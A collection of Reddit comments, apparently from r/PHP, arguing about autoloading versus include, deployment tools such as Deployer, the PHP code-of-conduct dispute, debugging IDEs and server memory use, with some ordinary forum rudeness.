Please don't undersell the difficulty. It's not hard but there are steps and a few concepts to understand. It would not be uncommon for somebody to have a few issues the first time out. 
I think it belongs here, but I respect your decision.
Heh, I found it. I did a short review of your library 2 months ago: https://www.reddit.com/r/PHP/comments/3q8xbz/feedback_sought_for_this_cryptography_library/ From your submissions on Reddit I see you post a lot of self-promo - which I'm completely OK with. But please don't yell at me like a hypocrite for posting what I find interesting and important, ok?
Okay, twenty seconds once you have done it a few times. But that's the point - everything is a continuous learning curve, and I meant my "just use it" as "go learn it". It's a step in the right direction.
Autoloading is overrated. The PHP community (unfortunately) tends to fixate on stuff without asking why is this the way it is, like MVC, autoloading, frameworks, PSR stuff, etc.
Forgive my ignorance here, but why is an ini setting "out of the question, for the reasons of inter-compatibility"? I don't keep up with `-internals` so I guess I've missed something?
&gt;I don't personally understand why it's such a bad thing to have a URL map to a file anyway. [...] I'm a very experienced software developer who works in PHP, WC/MVC ASP.Net, RoR, ad nauseum. No, what you're thinking of is called **routing** in pretty much every framework you just listed. Autoloading is completely separate, and has nothing to do with HTTP requests or URLs. 
You could run into a scenario where one PHP file in a single external package fails a type strictness check (while still functioning perfectly) and crashes your entire application.
&gt;composer autoloader and it resolves class names to files for you. Ever had to create classes for yourself? Ever have to put them in correct file paths so that what ever autoloader that is active can find them? Also. when your class name is like "\Abc\Def\Gh\Ij\Kl" and it maps to "./vendor/Abc/Def/Gh/Ij/Kl", yes, you totally get away not knowing the file location... &gt;Except that every modern IDE will tell you if the class is not found already. Yes. Tools can be made to workaround and compensate for flaws in the language. That does not mean that the flaws in the language does not exist at all... 
Yes I know all that... and none of it invalidates my point. Having to write the full namespace or a `use` isn't better *by itself* than include/require. As I already said there are many other advantages to namespaces/autoloading.
This isn't really the place for beginner tutorials, is it?
I see a gen a bit like reading from a buffer. If that makes more sense?
Using `use` is by itself better than using `include` or `require`. Because with `include` and `require` you have to know where the files you're including are located. With `use` you require no such knowledge, the only thing you're saying is "I want this class from vendor X within structure Y". So the package you need can be anywhere in the filesystem as long as an autoloader is present that knows how to translate a namespace to a file path. It's a useful abstraction.
Yeah, hence most successful projects have a strong leader to cut through the bullshit, when the collective decision making process breaks down and gets lost in minutiae.
This looks like a nice PHP-based alternative to Capistrano.
The PHP League has a great template for creating new packages: https://github.com/thephpleague/skeleton
Congratulations to everyone who got accepted.
Keep in mind this is really only the [A]ction in ADR being discussed / recommended here. The [D]omain isn't really exemplified here, and the [R]esponse is more akin to a typical controller setup than the ADR pattern. Definitely read up on Paul's paper on ADR to see what the major differences are. :)
&gt; In other words, stop being a pedant I'm not correcting you on typos or API calls here, you're actually mixing some pretty big and important concepts, and we can't really have a sane discussion without that getting fixed. &gt; ~~routing obscures the physical file being loaded up to service a specific request in the same way that autoloading does.~~ &gt; Routing obscures the class and method that service a request, the same way autoloading obscures the physical-file that contains the definition for a class or method. There, FTFY. If you don't like it, skip to the next section where I respond literally. In brief, any obscuration is either case is minor, and **utterly overwhelmed** by the other benefits they bring in for any reasonably-sized project. &gt; routing obscures the physical file being loaded up to service a specific request That's backwards. The only "physical file" a routing framework is concerned with is whichever one took the initial hand-off from Apache. Most use a "front controller" pattern, so that almost every single HTTP request going to hit a **single file**, often named `index.php`. That's usually nice and clear to any developer who glances over the Apache document-root and notices that it's one of the few PHP files hanging out there. It is immeasurably better than the maintenance-hell of a source directory whose folders and files are locked into a nearly 1:1 relationship with your public URL scheme. 
http://www.merriam-webster.com/dictionary/pedant &gt; one who is unimaginative or who __unduly emphasizes minutiae__ in the presentation or use of knowledge You've also tripped over yourself in your haste for pedantry. In particular, most (all?) tech stacks that don't employ routing map a URL directly to a physical file of some sort. Even URL rewriting typically maps to a physical file (just a different one). The developer can generally go directly to the relevant code by simply looking at the URL with little to no knowledge of the inner workings of the web server or the system in question. In a system with routes this mapping is no longer there, this means when you have routing, the __physical file__ is obscured. Exactly as I stated previously. And this pedantry about classes and functions really falls down when you consider that most systems place classes into a single file, so mapping to a class name is just mapping to a physical file by proxy. And if you're in a system that doesn't map it that way, then that system is __further obscuring__ the physical file that is getting loaded when the URL request comes in. I didn't write any of that for Terr's benefit, I wrote it in the hopes that anyone reading through these comments will understand why Terr is off base here. Terr is most likely young and mistakenly thinks pedantry indicates intelligence or ability.
&gt; This is yet again one of the most rationally defective arguments I could possibly hear to this. What, you've never heard the "your identity doesn't matter, only your code does" bullshit before? It beats the hell out of "go make a fork" in terms of hilarity, especially because ... &gt; No, I'll just go ahead and let the rest of the world keep talking about how our field is populated solely by autistics and sociopaths with no empathy, thanks. ... it comes from that same people that created this stereotype. Yeah, the quality of your code matters a lot, but guess what? Coding isn't all there is to working together as a team. Your ability to communicate clearly and effectively, your ability to cooperate and coordinate, and most importantly, your ability to work well with others makes a *huge* impact. It might also come as an *extreme* shock, but coding isn't all there is to operating a successful open source project. Has anyone looked at the contributors on the documentation team? It's almost as if the people saying things like that don't seem to be developers and haven't ever interacted with PHP at the project level before. But no, that'd be absurd, wouldn't it? 
Things exactly in that vein don't really apply to PHP half so much because 1) C has a huge amount of undefined behaviour by design, 2) C has an involved compilation process that goes well beyond the way high-level languages need to work and 3) C has no standard implementation. In C you can do all sorts of evil things that, are undefined, but often at least somewhat reliably going to work out in a certain way. (Just not guaranteed) Something like dereferencing a NULL pointer is undefined behaviour, but it will reliably cause a SIGSEGV on many systems. Higher level languages generally don't really need to have undefined behaviour. C has it to make writing a compiler relatively easy and keep the language spec fairly simple - if you just say 'integer overflow is undefined' then your compiler doesn't ever need to worry about being compliant if you decide to write INT_MAX + 1 and compile it on various different machines. A high level language generally sits on top of C or something similar, and the interpreter for it should only really rely on defined bahviour to create a predictable environment for code to execute in. Since PHP's include system is basically just 'parse this, parse that' It has little of the complexity inherent to creating an executable binary, linking with other binaries and all that. And since PHP has a basically definitively correct implementation to go with it it's relatively easy to say what will happen with any given code even if the specs are a bit dodgy. Just in generally - and it's a good thing to be this way for the most part -a high level language should not hit snags in those ways. 
I've been in the php world for 6 few years now and this sounds like a really fun project. I've been interested in doing some sort of D&amp;D online application, but never had real motivation to work on it yet. Message me if you are interested in me creating it for you. edit: actually, I took the time to make a small application that does this. Again, send me a message if you are interested. (I don't want to post the link to it here).
https://www.reddit.com/r/laravel/comments/425bte/using_jwt_with_laravel_to_create_a_simple/?ref=share&amp;ref_source=link Posted in /r/Laravel
THANK YOU. &lt;3
At my place of employment, the interview consisted of mostly finding out if I would be a good fit with the rest of the team I would be working with. I had a small written test comprised of some css questions, some general programming knowledge, and a problem to solve (in any language I wanted). After that I had a "take home test" which I had to program a small php application that would save and read data from a database using OOP and PDO statements.
One of my projects I use all the time is a file-management front end for managing a network-attached hard drive where I keep all my media (music, movies, shows), new content gets automatically downloaded there, so i have to login from time to time to organize things and fetch movie and tv-show information from a remote source to keep everything tighty. 
I'm a bot, *bleep*, *bloop*. Someone has linked to this thread from another place on reddit: - [/r/functionalprogramming] [Non-standard PHP library (NSPL): compact functional programming oriented code and more : PHP](https://np.reddit.com/r/functionalprogramming/comments/427fsi/nonstandard_php_library_nspl_compact_functional/) [](#footer)*^(If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads.) ^\([Info](/r/TotesMessenger) ^/ ^[Contact](/message/compose?to=/r/TotesMessenger))* [](#bot)
Does anyone use it in their work? How a typical setup and deployment looks like?
&gt; Psr-7 is annoying as hell to work with. can you provide more info on this statement?
I think someone else was doing something similar just with a composer package, by adding a stream filter that got executed for include()/require() etc
Dorito dust catches the light from /u/phpguy2's monitor as it settles slowly on his basement desk. His brief but rage-dense post on PHP's autoloading complete, he opened a fresh can of Mountain Dew from the adjacent mini-fridge. His work was difficult, and thankless, but he would soldier on. They had to be told...they *all* had to be told, about the error of their ways. He prayed silently to Python for strength. A single bead of Cool Ranch flavored saline that from his cheek. *It was just sweat*, he told himself.
Also [Webloyer](https://github.com/ngmy/webloyer)
`You are running composer with xdebug enabled. This has a major impact on runtime performance.` — [says Composer][1] on every launch, you should have noticed this. So yes, it slows things down, esp. in complex apps. And it can cause extreme memory consumption in long running cli scripts. [1]: http://stackoverflow.com/a/33928053
Yes, that would be /u/FrozenFire, but that breaks opcache support, and therefore isn't really applicable. For me, it was as simple as doing a find-replace against the last lines of my license headers ;-)
I'd say rsync is an advanced use-case, if you know you need it, you're probably already familiar with some of the details. Deployer solves a lot more other problems that you might not even know you had. I think the example they show on the getting started page is a pretty good example, Symfony is a pretty complicated framework and takes a lot of steps to deploy. The symfony recipe is a one-line include, and 3 lines of configuration that make it all happen for you, correctly (with all the optimal command line arguments to make sure the log output is clean, the appropriate commands are run with the --prod or --optimize flag, and so on), and it already solves interesting problems that you didn't know you had, like normalizing the date stamps on your assets: https://github.com/deployphp/deployer/blob/master/recipe/symfony.php#L58-L65 Additionally, deployer gives you atomic deploys by default, deploying to a new directory then moving a symlink over. Again, nothing you couldn't do yourself in a makefile, but this is already done for you, properly, and the recipes have things like shared directories preconfigured so you won't forget to add parameters.yml to your shared list and end up scratching your head as to why your database config gets dropped on every deploy.
Thanks that makes a lot of sense then =)
Oh? What social repercussions are there currently for a collaborator on an open source project who is harassing me for my race, gender, or other protected class? And if you don't think *this specific* CoC solution was a good one but you're open to *some* kind of formalized harassment policy, I'm totally open to discussing compromise.
I don't really get it - if you need strict typing, use a strictly typed language? Or at least one in which you can mock the native structures enough that it can be used more or less without recognizing the difference by outside observers. If you're finding duck-typing insufficient that often you should look in to various languages that have a standard type for homogenous lists or just generally a harder type system. 
Did you try the phar file?
About 2 - 8 hours work depending on what design went with it.
How does compare to rocketeer - http://rocketeer.autopergamene.eu/ another PHP deployment tool?
&gt; php_value xdebug.remote_host 192.168.XXX.XXX That's exactly what we do at work and never had an issue. We have folks that debug locally using vim, and others remotely using PhpStorm.
Can you recommend a decent guide for somebody newly approaching the subject?
You might like to use Hack or Java instead of PHP. You think you want this, but you really don't I assure you. Writing an application like this would essentially mean you'd have to write every single line of code by yourself; because no one is writing code like this in PHP. A lot of libraries and apps are using a lot of type hinting, in great ways. But I would be surprised if there is any existing PHP library that would actually work if you turned this feature on.
I'm leaning further away from using PHP on the back end because with the advent of a lot of new, high performance platforms, like GO, Openresty and Cpoll, PHP seems to fit better as a platform for consuming the back-end rather than being the back end. If you find Laravel something useful for a backend then you might like Lumen which is a new microframework (https://lumen.laravel.com/)
Messing around. I learned some C because I wanted to at one point, and I've had the good fortune to be around some people with a strong knowledge in the area. I'm not expert but I also did a security course that necessarily involves learning some about how the machine actually works and that almost always comes along with examples and demonstrations using C. I've played around with Linux enough to have the gist of signals - including the mentioned SIGSEGV. Since I've written some C I've also seen SIGSEGV plenty when I made mistakes. Just have an interest and mess around. Over the years you soak up some stuff.
My favorite pull request https://github.com/deployphp/deployer.org/pull/26
do you ever github bro? 
I know, I know-- use a provisioning tool (like ansible --didn't like puppet for what I wanted to do https://forge.puppetlabs.com/BradChesney79 ). But, otherwise, anything sticking out as particularly troublesome? (pretending that I'm not littering the passwords in plaintext everywhere.) PHP info page (has Content Security Policies (CSP) set-- which disallows inline CSS among other things. Aaand phpinfo is all styled within the page and not an external to the page but same server asset as required by the policy. Server level XSS prevention... I would prefer not to be part of a botnet, but this is a server that can just get wiped if anything gets out of hand.
Yes, you are absolutely correct on all points. Especially the popcorn bit.
If you don't like, fork it!
Any examples of how you'd use a Makefile to deploy a project?
I lead a local PHP group and I get a lot of questions about server setup-- kind of doing this as a follow along learn monkey see, monkey do style. I've cataloged the commands I run to setup a server previously, but they weren't part of a script they were more or less manually entered to catch any SNAFUs in setup right when the command was run. But, I'm not as patient as I used to be. That and it is getting old telling these kids to flim flam the flopper essentially and just watching them not have the foundation underneath the very targeted instructions to comprehend what they need to do. "Sites-available, what's that?" With the overwhelming bulk of default values in the existing setup.conf, a whole server accessible via the IP address will spin up and they can see what needs changed by just following the script on their own, without me, because I'm otherwise occupied doing a ton of Yak Shaving-- full schedule of it. Very busy.
I wonder if literally any comment I make in this thread will get downvoted too? 
Have an upvote friend
idk nowadays this this feels like a lackluster, deployment without integration... might as well delve into jenkins to have the entire CI setup that can also deploy
I'd give gold but I'm cheap
Here's a rewritten version I found: # Contributor Code of Conduct As contributors and maintainers of this project, and in the interest of fostering well designed, robust code, we pledge to scrutinise all contributions through reporting issues, posting feature requests, updating documentation, submitting pull requests or patches and other activities. We are committed to making participation in this project a results-driven experience for everyone. No regards will be given to identity, labels, values or beliefs as this project does not discriminate participants based on such aspects. Participants are discriminated only by contributions made to the project. Examples of unacceptable behavior by participants include: * Whinging, unjustified complaining and otherwise acting "childish"; You are judged as an adult * Spamming or having an excessive noise-to-signal ratio * Deceptive and/or passive-aggressive language that hides true intent; Honesty is valued * Overtly and/or purposely misunderstanding context or demanding that context be reinterpreted. * Demanding that the project change to suit the needs of contributors instead of the other way around Project maintainers may, at their discretion, remove, edit, or reject comments, commits, code, wiki edits, issues, and other contributions that are not aligned to this Code of Conduct, or to ban temporarily or permanently any contributor that purposely and/or maliciously makes one or more contributions that are not aligned to this Code of Conduct. By adopting this Code of Conduct, project maintainers commit themselves to be guided and informed by these principles to every aspect of managing this project. Project maintainers who do not follow of enforce the Code of Conduct can state justifications for their actions, other project maintainers are free to agree or disagree. This Code of Conduct applies only within project spaces or public spaces in which a contributor is formally representing the project. All other public spaces and private spaces are free of this Code of Conduct. Instances of childish, ridiculous, or otherwise vacuous behaviour may be reported by contacting a project maintainer through [ANONYMOUS METHOD]. All complaints will be reviewed and investigated and will result in a response that is deemed necessary and appropriate to the circumstances. Maintainers are obligated to maintain transparency with regard to the contents and resolution of an incident. This Code of Conduct is an improvement to the [Contributor Covenant][homepage], version 1.3.0, available at [http://contributor-covenant.org/version/1/3/0/][version]
Choose a popular framework then. What if they hire someone who doesn't know PHP, are you worried about that too? 
From the article: &gt; When any part of the product information changes, we rebuild the information and re-index that product. However the schema tends to say something different: "SOAP, REST, Database queries, …". So I would say either their Symfony app gets notified when product data changes and thus updates it, or either the index is rebuild periodically (every night). I've seen the latter work well in the wild (depending on the use case of course). That's just my interpretation of course.
[removed]
If you choose a popular framework then how it works will be well documented and there will be a community to engage with. So yes, that is what I'm saying. Which framework you pick is up to you. It sounds like Laravel would do the job for you. I personally don't use it but it seems to be popular with a decent sized community around it and it seems a good entry level framework. 
I dont mind using pre-existing encoders, compressors, etc. as long as i have full freedom to build and monetize the end product ( without issue ) if i can build out the entire project. What platforms are you referring to?
You've already said that your intention is mostly to learn, so that justifies a DIY approach. But for anyone starting to build something like this they need to realise that just getting video to be watchable in one format is just the tip of the iceberg. Users want to be able to view videos in 10 different kinds of devices these days (mobile, smart TV, HTML5, flash, ...) and they prefer to be able to stream the videos, progressively download them, download them as a file to their computer. They want the videos to work on a slow mobile connection but also want to be able to project on their 10m wall at home. And to add to all this, there are new devices and formats every two years. It's not like saving an image as JPEG and then you can see it everywhere. Read up on Netfilx's technology stack to get an idea what they are facing.
Thank you for the in depth feedback. While this is a personal project and mostly to learn if i can build what i have in mind i have the opportunities/network to really get it off the ground which is one of the reasons why i would consider using existing software if it means the end goal is built in its entirety. I will be looking into your suggestions i really appreciate the help.
Mostly a lot of disk space. Video is huge and consumers demand a high degree of fidelity. My personal collection of videos prefers h.264 mp4s with aac for audio, with around 2 mbps for the video and 96 kbps for the audio, which results in roughly 800 MB per hour of content. You mention a couple hundred thousand users as the initial audience, and if we assume an average of 30 min of video at similar settings per user, you require 76 TB, from the get go.
Honestly. From the question in general. If you were to not use a framework, (Symfony or Laravel or Yii) it would probably be harder for another developer to inherit your code. Its better to use a framework that is at least somewhat familiar then be 100% custom, or even a random combination of composer packages that might get abandoned. With that being said what else does your "site" need to do since for instance Laravel 5.2 comes with "out of the box" User management so yeah.
I am gonna recommend separating out the isomorphic react app into a separate subdomain. What you are talking about is possible, and I'll explain how below, but it's gonna be much much easier to just stick the app on "app.domain" or "tool.domain". If you decouple the app from WordPress: 1. You can deploy the tool to Heroku or some simpler hosting situation. You can treat your app as 12 factor without worrying about WordPress. 2. By building a standard isomorphic node app you can use existing boilerplates and knowledge floating around. Onboarding new project members is easy since you aren't doing anything weird. 3. You can use push state routing (pretty URLs without the hash). The WordPress router makes this nigh impossible to get working. 4. The setup I'm about to describe has lots of moving parts. Subdomain method is simple. Now, for fun, let's say you wanted to do the embedded isomorphic approach. 1. Build the isomorphic app with express and such. Deploy to server. I'm gonna call this the "Express Server". We are gonna treat this server as a sort of "API" server. It doesn't return JSON, it returns rendered HTML. 2. In WP when your special page is called you should proxy the Express Server with the proper arguments. Take the response from the proxied request and dump it on the page. 3. Enqueue the application bundle JavaScript in WordPress. After the initial proxied request, client side rendering takes over. Bottom line is that you will have to build the Express Server anyway. Mind as well just go the path of least resistance and build a standard node app on a subdomain. 
So my first thought is "Why did you not just use Hacklang?"
... because of autoloading
How about https://cartalyst.com/manual/sentinel/2.0 It's framework agnostic, but also integrates with Laravel 5. I haven't used it myself, but maybe someone else have something to say about it.
Sounds nice! I'd love a post with the details/breakdown of this, if you have the heart to make one.
I'm leaning in that direction. I just need to sell it. I also just found [this](https://www.youtube.com/playlist?list=PLfdtiltiRHWGKUvioJly40RJZchSG2-34) which may be good.
I'll check it out. Thanks.
why not just 0auth ?
Welcome to the world of modern PHP development.
I don't quite get why you are trying to combine two unrelated things. Why can't you just create a iterator that returns: video, ad, video, ad, .... And track their ids or whichever thing you are using for pagination.
Interesting. Do you recall where you found that?
What does this offer above and beyond Phile or Pico? At first glance the docs appear identical.
Unless you are running the exact same code (symfony) ported to Python and exactly the same amount of users. This would be impossible to tell.
For production use? Don't. There's no compelling reason to put the most likely thing to cause big security issues on yourself when there exist so many implementations out there that are better tested and far, far more likely to see updates than anything you make one-off for your own project and inevitably lays dormant for years after you move on. Even ignoring the security implications there are just also so many decent implementations that give you everything you want, possibly more, for free. Why not use it? Maybe another maintainer doesn't know the framework you used for user management, but it's guaranteed they won't know what you in particular wrote to make your own user management version. 
I don't know, why do you compare Fansoro with Phile or Pico. There is no references to this CMS's. Fansoro is much better both of them if you want to know. Fansoro is Faster, Better, Easy. There is 50 plugins for Fansoro and will be 50 new.
The documentation is nearly identical. Like, nearly word for word.
Install New Relic and dig for yourself.
Thats like asking if its normal that Toyota cars use more gas than Hondas. It's wholly dependent on the make and model of car. Memory usage is wholly dependent upon what an application does and how that application is written, not which language its written in. (Efficiencies are different from language to language, but the differences are not significant enough to be able to make broad generalizations like "php uses more memory in most cases")
* http://philecms.com/docs.html * http://picocms.org/docs/#creating-content * http://fansoro.org/documentation/content/pages All I ways saying is that the docs are identical. Look at the docs for URL structure and tell me they aren't copied verbatim. That is all I was wondering. :)
As I say before: go to google and you will find a lot of same URL structure, not only in this 2 CMS's that you have mentioned. You will found it in hundred's.
LOL Edit: I went to check out morfy.org that was posted months back because I recalled they shared the same documentation *verbatim* but... I see Morfy now just redirects to Fansoro. So nothing new or exciting here.
Morfy, after 2 years of development was re-branded to Fansoro. I am Founder of Morfy that was re-branded to Fansoro in 2016. So, that's why documentation of Fansoro is the same as it was for Morfy, Because Morfy == Fansoro
Yep. :)
Fansoro 2.0.4 Release! http://fansoro.org/blog/fansoro-2.0.4
Specifically you'll find a massive decrease in memory usage if you tune down how many connections mysql will listen for; the `max_connections` setting. It preallocates those and they takes _tons_ of memory up.
&gt; Why do you want to compare them &gt; Fansoro is Faster, Better, Easy please
&gt;Fansoro is simple and work great, the file template is a great idea, i love it. &gt; - Fred thanks fred
yes, of course Fansoro is better than that 2 piece of shit: pico and phile
That is how you're selling your project?
mysql uses a lot of RAM. Go back to postgres, but with PHP, see if the problem abates. I've never known anyone to try to cram an entire stack onto a 512mb VPS (no matter what the marketing says it's vastly different experience to a dedicated PC with 512mb ram). Also, try to run your app using PHP7. It uses less RAM for arrays and is generally a lot faster and more efficient; I would never bother to check if it's faster than Python as what does that check add, but I'd imagine it's a lot faster than mysql + php5-fpm + nginx
http://www.slideshare.net/olvemaudal/deep-c/297?src=clipshare The Deepest part I saw in the entire presentation was this (see link), and alignment, which has not always been forced in all compilers, and used to be a nice low-hanging fruit.
Not in PHP that I know of. There are a couple of C libraries you could build bindings to and make a PHP extension as well as a Pure HTML5 library (http://www.vexflow.com) - that might be much easier than integrate with depending on what you need to do. 
In recent years I've had increasingly poor experience with mysql on both small and enterprise applications. Posgres has been rock solid. If I could get mssql for Linux, I'd be using it 
This is the only response that makes sense. Everyone else is just giving advice and guesswork. You need to measure, which means you need to look. So start with the tools that give you information about resource usage.
I actually investigated if you could call a method using php7 after I posted my earlier comment. I usually just ignore the magic but this got me interested. https://3v4l.org/4n6Em its very similar to what you wrote. :) class Foo{ public function __call($n, $a){ return $this-&gt;$n-&gt;call($this, ...$a); } } $f = new Foo(); $f-&gt;b = function($x){return$x;}; var_dump($f-&gt;b(7)); This would need to be cleaned up. Maybe a instanceof Closure check, a little backwards compatibility added with Closure::bind or bindTo and then pop in a trait and it could work for many classes. &gt; standard PHP provides no way to modify the available methods on a class or object at runtime. I've actually haven't considered modifying at run time besides when toying around with different features. Built in class properties would be off limit I'm assuming or maybe not, if they are exposed? &gt; Runkit is not often available and its use is not recommended in production. I would agree this.
PHPStorm, /thread https://www.jetbrains.com/phpstorm/
PHPStorm... (I don't think anyone else needs to answer anymore)
&gt; Higher level languages generally don't really need to have undefined behaviour. There's always edge-cases, though. Modifying an array while iterating over it, for example, is a problem in both PHP and Ruby.
Are you using multiple PHP FPM workers?
NetBeans works fine for us.
Am I the *only* eclipse PDT user??? :-/
Everyone's right about PHPStorm, but [codebug](http://codebugapp.com) is another option (OS X only)
Laravel is pretty awesome, but migrations still seem really icky to me. There is something that smells really wrong about them I haven't quite put my finger on.
Timing differences of that magnitude are almost never, and close enough to be never, the fault of the framework.
Used to use PDT as well, it's good and gets the job done. I was reluctant to try PHPStorm, but eventually I did. I switched the key bindings in PHPStorm to be Eclipse bindings, and the rest is history. Once you try PHPStorm, you'll understand.
I have been using Komodo IDE for the last 4 or so years. Until recently, it was great. Now it crashes every couple of times you start a debug session. Even as a paying customer, support were useless (first gave a bug report almost a year ago, still no fix). I do not recommend it.
&gt; They need to be processed into one or many formats that are suitable for viewing on the web. For this, APIs exists such as: Or you can do it locally with `ffmpeg`. I don't know if that's the most performant approach, though. It's probably quicker if you have some ridiculous multi-GPU beast.
&gt; Fixing this right now would mean loading the class, which has a non-negligible performance cost. With a proper module system though, that would only require a cacheable `stat` call. `stat` isn't particularly fast, and I do wonder how slow loading a class is from opcache. (I've no idea, I've never measured either.)
It's difficult to enforce the unwritten, because it's much less clear who has the authority to do so.
+1 for you. First thing I thought of was lilypond. Trying to write out stuff in lilypond by hand is silly, but with a programatic backend it could be really effective. Source: was a copyist through graduate school in music performance. Now a web developer from 8-5. 
I'll allow it!
The first time I used it, I actually hated it. Even further, I didn't understand why people would *pay money* to use it. Once I got into it, though, things started to make a lot more sense and I began to develop better habits. Not simply by virtue of me using PHPStorm, but by being able to leverage all of the tools it provides out of the box so easily. One of the biggest things for me early on was the automatic code refactoring that falls in line with PSR-1 and PSR-2 standards. I could run a single command on a project directory that could make my entire project PSR-1/2 compliant. In addition, its built-in code inspector is remarkably intelligent and will highlight any areas that could prove to be problematic. This is especially useful in flat .html files, where you might need feedback about incorrect image dimensions or missing alt/title tags. But probably one of its most useful features - for me - is its local version control. Even though it easily integrates with just about any version control system you can throw at it, PHPStorm actually doesn't require you to save anything and will instead detect and save changes automatically for you. When it does this, it's actually making mini-commits to its own local version control that you can roll back to at any point. I can't tell you how many times this has saved me in legacy projects I've inherited that had no version control set up. Everything else that you can think of needing in an IDE is likely built into PHPStorm. While Eclipse, Aptana, and Netbeans can all come pretty close through the use of some well-built third-party plugins, PHPStorm sets the bar a bit higher by including most of the functionality developers use right out of the gate. I'm definitely a fanboy of PHPStorm, but if you're still not convinced after its free 30 day trial, the other developers I work with seem to love SublimeText. While I personally haven't used it, it looks to come a lot closer to what PHPStorm has to offer and I believe that it might be worth exploring as well. In the end, what actually matters is what IDE makes you a more productive developer. I ended up having to abandon Eclipse due to its incredibly long indexing processes. As my Workbench grew, so did the indexing times. The machine I was using probably played a large role in that, but switching over to PHPStorm at the time pretty much eliminated those issues for me, and I was able to use all of the tools I was used to using all under one umbrella. I'm generally against spending money on software, but it was the best damn $100 I've ever spent.
Threads like this is why I think theres an unhealthy slant towards one vendor over the other. No PHP Storm is not the only way. Netbeans, Eclipse and Zend Studio will work just as well and I have the first hand experience to prove it. You will go through the same amount of effort to debug in all of the above. Now with that, do you want to pay perpetually for one IDE over the other. I've used all of these IDEs professionally and none of them can't debug. So pick anyone of these as long as you are productive and can live with their cost.
It's a brand new account (literally created that day) accusing a person of color of being racist against people of color in pull requests even though none of the pull requests the previous six months had been declined. The attempt at "social justice" style rhetoric is rather half-assed too. It's classic concern trolling, right down to the ole "I don't understand why you're so angry!" canard.
**To answer the question from title:** PHP doesn't cache any *script execution results*, that were implied, I believe. PHP can cache only the result of PHP files parsing, called opcode cache. If your files are huge, it could be an issue. That is all that PHP may cache on its side. **To answer the question from body:** Nobody knows. It could be anything - a filesystem cache, an SQL query cache, virtual memory issue or whatever else you may think of. You have to profile your morning run if you want to know for sure
+1 for VexFlow. The docs are a little lacking in places, but I've been using it to great effect in a new project this week and the SVG renderer looks great.
Tere is a few "real" projects that were done in LilyPond. github has a few examples. Its pretty cool :)
The great thing about deployer is that it is extremely easy to understand. If I have a problem, I can easily fix it myself. I'm so done with searching google and stack overflow because some tool that I don't understand doesn't work the way I expected it to work.
Not on the phpstorm hype train, but those three being java-based and resource heavy is the main reason why I wouldn't recommend them, though I do use netbeans for C++ debugging, and have tried each of those for PHP in the past. Who knows, maybe they're heaps better now. I really need to start shopping around again.
I use VISUAL STUDIO with https://visualstudiogallery.msdn.microsoft.com/6eb51f05-ef01-4513-ac83-4c5f50c95fb5 I debug all the time! Pushing code via GIT and debugging on servers.
&gt;Spending money is part and parcel of development Not for a tiny Symfony website it isn't. &gt;If you use top to profile your applications Who said anything about application profiling you arrogant twat? We're looking for *what component is consuming memory* when OP stated he changed more than PHP on his stack. The culprit is clearly MySQL since it consumes more memory than Postgres. But no, let's go out and buy a $150 subscription to New Relic for a single, newly-deployed 512mb host for the sole purpose of investigating application flow, even though Xdebug exists and the problem is most likely nothing to do with the OP's code as it's clearly a new deployment and PHP is never constantly running by design anyway, thus memory usage would never be constantly high. Try reading the thread next time, ta.
Sublime text is okay. Better than notepad, notepad++, textmate, etc. but still a very stripped down IDE. Almost no support for code completion, no debugger, no version control integration. There are some plugins that provide this functionality, but, in my experience, it's pretty limited. If you're looking for something quick and dirty that's better than using vim or emacs, sublime text is the way to go. Otherwise, IntelliJ, PHPStorm, etc. is really good
You're a Visual Studio .NET developer? You've got a great solution you might be instantly comfortable with in Visual Studio Code editor. I'm running Ubuntu with an Apache local server with XDebug installed and using VS Code as my editor/debugger. VS Code does a really good job with PHP syntax checking and Intellisense. With php-debug extension installed it's also an easy to use debugger. I prefer it over Eclipse or PHPStorm. 
I was using Komodo but recently switch to Visual Studo Code and haven't looked back. See my reply elsewhere on this post.
I got netbeans to work once but after finishing the session I had to restart netbeans before starting another session. Phpstorm works perfectly (and I find it better in other ways too)
Atom has a package that brings xdebug integration. I really like atom because it's so customisable and the development cycle is so fast.
It's not particularly difficult to set up distinctions via auto wiring. It depends on how you want to implement it. Say, for example, Component A requires one \PDO and Component B requires another \PDO, you're completely right in saying that typehinting for a \PDO will ruin all the things. That's why things like delegation to a factory for this could come in useful, or explicitly stating "this class gets this instance, this class gets this other instance" in configuration. Auto-wiring configuration can be flexible depending on how you set it up, including specifying scalar parameters during instantiation if you don't want to use a factory; we're talking one line in a config file for that distinction and edge case to be made. You could also define this in a bounded context. That's just one way of doing it, and at this point I'd say it's more about how you want to structure your codebase and injection capabilities rather than anything else. Of course all of this also depends on your implementation of an auto wiring injector. I would say the largest team I have worked with this is 15 devs; which may not be particularly large to be fair. But it worked. So maybe there is a limit to the number of people working on a project and the skill of the lead devs and architecture that could be the boundary between being able to choose this as a useful tool or requiring something more explicit. Of course, those developers picking dependencies at will is pretty much the same problem as if they start typing 'new' everywhere - it's basically the same thing. Sure, with automatic DI it becomes painless to do dirty things. However it is painless without auto-DI as well (just call new). At least with automatic injection it becomes FAR easier to refactor. And to me that single benefit alone makes it worth while. The only way to enforce not having devs mess up in controllers is code review, (at least that's what I and others have found). They're not the be-all and end-all, but JAVA Spring was so popular and widely used for a reason. It's a trade-off, as it always is.
&gt; That's why things like delegation to a factory for this could come in useful, or explicitly stating "this class gets this instance, this class gets this other instance" in configuration. The moment you need to specify it in configuration it's no longer "autowiring", but it's still the lesser evil than trying to introduce factories in the *components* you use (the signatures of which you may *not control*, mind you), because of a weakness in your injector. Think if, for example, you can download Doctrine and replace its signature with your factories, because otherwise it's too confusing for your autowiring container. You can't, right? We're talking about reusing components here. This includes third party components, otherwise you can't say you reuse much. &gt; Of course, those developers picking dependencies at will is pretty much the same problem as if they start typing 'new' everywhere - it's basically the same thing It's not the same thing because with proper architecture you can't instantiate a class and use it without having its configuration. Which is why you use the one that's configured for you. To take the example of SQL Connection again, to make a "new" one you need to know the host, port, user, password, dbname and the table mapping, to start with. If those are deployment specific, you don't know them, because you don't know, and shouldn't know where the config is. If you know where it is, you're wiring yourself to the environment, and your component is no longer reusable. All of that is possible to define via architectural boundaries and intelligent (non-auto) injection which is defined by the architect. &gt; JAVA Spring was so popular and widely used for a reason Yes, "was". Guess what's one of the most commonly cited flaws of Spring these days. The way it entangles dependencies together. &gt; It's a trade-off, as it always is. Right, but in this case it's a trade-off between short term benefits and long term project viability. I'm used to projects that last for years. So whether I can save myself a few lines of code in the first week or two is completely irrelevant if it botches the architecture of the project over the next 5 years. Anything that claims to save a few lines of code and offers little else is automatically suspicious. If it guesses things by convention it means you don't control how it works, it controls 